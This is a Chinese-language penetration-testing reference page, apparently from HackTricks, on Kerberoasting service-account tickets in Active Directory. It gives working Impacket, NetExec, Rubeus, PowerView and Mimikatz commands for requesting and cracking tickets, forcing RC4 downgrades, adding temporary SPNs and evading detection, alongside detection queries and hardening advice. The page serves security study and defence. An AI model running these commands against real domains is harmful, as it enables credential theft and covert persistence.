# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting 专注于获取 TGS tickets，具体来说是获取与 Active Directory (AD) 中以用户账户运行的服务相关的 tickets，不包括计算机账户。这些 tickets 的加密使用源自用户密码的密钥，因此可以进行离线凭据破解。使用用户账户作为服务的情况，会通过非空的 ServicePrincipalName (SPN) 属性体现出来。

任何已通过身份验证的域用户都可以请求 TGS tickets，因此不需要特殊权限。<sup>[[4]](#references)[[5]](#references)</sup>

### Key Points

- 目标是以用户账户运行的服务的 TGS tickets（即设置了 SPN 的账户，不包括计算机账户）。
- Tickets 使用源自服务账户密码的密钥加密，并且可以进行离线破解。
- 不需要提升权限；任何已通过身份验证的账户都可以请求 TGS tickets。

> [!WARNING]
> 大多数公开工具倾向于请求 RC4-HMAC (etype 23) service tickets，因为它们比 AES 更快破解。RC4 TGS hashes 以 `$krb5tgs$23$*` 开头，AES128 以 `$krb5tgs$17$*` 开头，AES256 以 `$krb5tgs$18$*` 开头。不过，许多环境正在转向仅使用 AES。不要假设只有 RC4 相关。
> 同时，避免使用“spray-and-pray” roasting。Rubeus 的默认 kerberoast 可以查询并请求所有 SPN 的 tickets，容易产生噪声。应先枚举并定位有价值的 principals，再进行针对性攻击。

### Service account secrets & Kerberos crypto cost

许多服务仍以使用人工管理密码的用户账户运行。KDC 使用源自这些密码的密钥加密 service tickets，并将 ciphertext 提供给任何已通过身份验证的 principal，因此 kerberoasting 可以在没有账户锁定或 DC telemetry 的情况下进行无限次离线猜测。加密模式决定了破解所需的预算：

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1，使用 4,096 次迭代，以及由 domain + SPN 生成的每个 principal 专用 salt | etype 17/18 (`$krb5tgs$17$`、`$krb5tgs$18$`) | ~6.8 million guesses/s | Salt 会阻止 rainbow tables，但仍可快速破解较短的密码。 |
| RC4 + NT hash | 对密码执行一次 MD4（无 salt 的 NT hash）；Kerberos 仅为每个 ticket 混入一个 8 字节的 confounder | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | 比 AES 快约 1000 倍；只要 `msDS-SupportedEncryptionTypes` 允许，攻击者就会强制使用 RC4。 |

*基准数据来自 Chick3nman，见 [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)。<sup>[[3]](#references)</sup>

RC4 的 confounder 只会随机化 keystream；它不会增加每次猜测所需的计算量。除非 service accounts 依赖随机 secrets（gMSA/dMSA、machine accounts 或由 vault 管理的 strings），否则 compromise speed 完全取决于 GPU budget。强制使用仅 AES 的 etypes 可以移除每秒十亿次猜测的 downgrade，但弱的人类密码仍会被 PBKDF2 破解。<sup>[[3]](#references)</sup>

### Attack

#### Linux

参考文献 [1] 中提供了一个使用 NetExec 请求可用于 roasting 的 tickets，并使用 Hashcat 破解它们的实用端到端示例。<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
包含 Kerberoast 检查的多功能工具：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- 枚举 kerberoastable users
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1：请求 TGS 并从内存中 dump
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Automatic tools
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS 请求会生成 Windows Security Event 4769（请求了 Kerberos 服务票据）。

### OPSEC 和仅使用 AES 的环境

- 有意为不支持 AES 的账户请求 RC4：
- Rubeus：`/rc4opsec` 使用 tgtdeleg 枚举不支持 AES 的账户，并请求 RC4 服务票据。
- Rubeus：`/tgtdeleg` 与 kerberoast 一起使用时，会在可能的情况下触发 RC4 请求。<sup>[[6]](#references)</sup>
- 对仅支持 AES 的账户执行 Roast，避免静默失败：
- Rubeus：`/aes` 枚举已启用 AES 的账户，并请求 AES 服务票据（etype 17/18）。
- 如果你已经持有 TGT（通过 PTT 或从 .kirbi 获取），可以将 `/ticket:<blob|path>` 与 `/spn:<SPN>` 或 `/spns:<file>` 一起使用，从而跳过 LDAP。
- 目标选择、限速和减少噪声：
- 使用 `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>` 和 `/jitter:<1-100>`。
- 使用 `/pwdsetbefore:<MM-dd-yyyy>`（较旧的密码）筛选可能存在弱密码的账户，或使用 `/ou:<DN>`  targeting 特权 OU。<sup>[[8]](#references)</sup>

示例（Rubeus）：
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### 破解
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

如果你控制某个账户或可以修改该账户，则可以通过添加 SPN 使其变得可被 kerberoast：
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
将帐户降级以启用 RC4，便于 cracking（需要对目标对象具有写入权限）：
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### 通过 GenericWrite/GenericAll 对用户执行定向 Kerberoast（临时 SPN）

当 BloodHound 显示你拥有对某个用户对象的控制权（例如 GenericWrite/GenericAll）时，即使该用户当前没有任何 SPN，你仍然可以可靠地对该特定用户执行“定向 roast”：<sup>[[9]](#references)</sup>

- 向受控用户添加临时 SPN，使其可被 roast。
- 请求一个使用 RC4（etype 23）加密的 TGS-REP，以便进行破解。
- 使用 hashcat 破解 `$krb5tgs$23$...` hash。
- 清理 SPN，以减少痕迹。

Windows（PowerView/Rubeus）：
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux 单行命令（targetedKerberoast.py 自动执行 add SPN -> request TGS (etype 23) -> remove SPN）:<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
使用 hashcat autodetect 破解输出（对于 `$krb5tgs$23$`，模式为 13100）：
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes：添加/移除 SPN 会产生目录变更（目标用户上的 Event ID 5136/4738），而 TGS request 会生成 Event ID 4769。考虑进行限速并清理命令提示记录。

你可以在这里找到用于 kerberoast attacks 的实用工具：https://github.com/nidem/kerberoast

如果你在 Linux 中遇到此错误：`Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`，这是由本地时间偏差导致的。请与 DC 同步：

- `ntpdate <DC_IP>`（某些发行版中已弃用）
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

2022 年 9 月，Charlie Clark 说明，如果某个 principal 不要求 pre-authentication，则可以通过构造 KRB_AS_REQ 并修改请求正文中的 sname，来获取 service ticket，从而有效获取 service ticket 而不是 TGT。这与 AS-REP roasting 类似，并且不需要有效的域凭据。

详情请参阅 Semperis 的文章《新的攻击路径：AS-requested STs》。<sup>[[10]](#references)</sup>

> [!WARNING]
> 你必须提供用户列表，因为没有有效凭据时，无法使用此技术查询 LDAP。

Linux

- Impacket (PR #1413)：
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
相关

如果你的目标是 AS-REP roastable 用户，另请参阅：

{{#ref}}
asreproast.md
{{#endref}}

### 检测

Kerberoasting 可能具有隐蔽性。针对 DC 查找 Event ID 4769，并应用过滤器以减少噪声：

- 排除服务名称 `krbtgt` 以及以 `$` 结尾的服务名称（计算机帐户）。
- 排除来自机器帐户的请求（`*$$@*`）。
- 仅保留成功的请求（Failure Code `0x0`）。
- 跟踪加密类型：RC4（`0x17`）、AES128（`0x11`）、AES256（`0x12`）。不要仅针对 `0x17` 触发告警。

PowerShell triage 示例：
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
其他思路：

- 为每台主机/用户建立正常的 SPN usage 基线；如果单个 principal 突发请求大量不同的 SPN，则触发警报。
- 在已强化 AES 的域中标记异常的 RC4 usage。

### Mitigation / Hardening

- 为服务使用 gMSA/dMSA 或 machine accounts。Managed accounts 使用长度超过 120 个字符的随机密码并自动轮换，使 offline cracking 变得不切实际。<sup>[[7]](#references)</sup>
- 通过将 `msDS-SupportedEncryptionTypes` 设置为仅使用 AES（十进制 24 / 十六进制 0x18）来对 service accounts 强制使用 AES，然后轮换密码，以便派生 AES keys。<sup>[[7]](#references)</sup>
- 在可能的情况下，在环境中禁用 RC4，并监控尝试使用 RC4 的行为。在 DC 上，可以使用 `DefaultDomainSupportedEncTypes` registry value 来为未设置 `msDS-SupportedEncryptionTypes` 的 accounts 指定默认值。请充分测试。
- 从 user accounts 中移除不必要的 SPN。<sup>[[7]](#references)</sup>
- 如果无法使用 managed accounts，则为 service accounts 使用较长的随机密码（25 个字符以上）；禁止使用常见密码并定期进行 audit。<sup>[[7]](#references)</sup>

## References

- [1] [HTB：Breach – 实战中的 NetExec LDAP kerberoast + hashcat cracking](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting：来自旧版 Kerberos Crypto 的低技术、高影响攻击（2025-09-10）](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos（II）：如何攻击 Kerberos？](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse：T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting：在启用 AES 时请求使用 RC4 加密的 TGS](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog（2024-10-11）– Microsoft 关于帮助缓解 Kerberoasting 的指导](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast command 文档](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB：Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – 新的 Attack Paths？AS Requested Service Tickets（Charlie Clark，2022 年 9 月）](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
